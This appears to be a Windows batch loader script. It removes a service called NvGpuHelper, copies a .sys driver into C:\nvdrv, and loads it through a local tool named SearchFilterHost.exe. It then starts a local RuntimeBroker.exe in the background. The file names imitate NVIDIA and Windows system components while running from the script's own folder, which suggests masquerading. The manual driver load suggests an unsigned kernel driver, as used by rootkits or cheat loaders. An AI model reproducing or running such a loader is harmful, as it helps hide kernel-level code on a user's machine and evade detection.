@echo off
cd /d "%~dp0"

sc stop NvGpuHelper >nul 2>&1
sc delete NvGpuHelper >nul 2>&1
timeout /t 2 >nul

if not exist C:\nvdrv mkdir C:\nvdrv
copy /y NvGpuHelper.sys C:\nvdrv\ >nul

SearchFilterHost.exe driver load C:\nvdrv\NvGpuHelper.sys

timeout /t 5 >nul

start /b RuntimeBroker.exe
exit
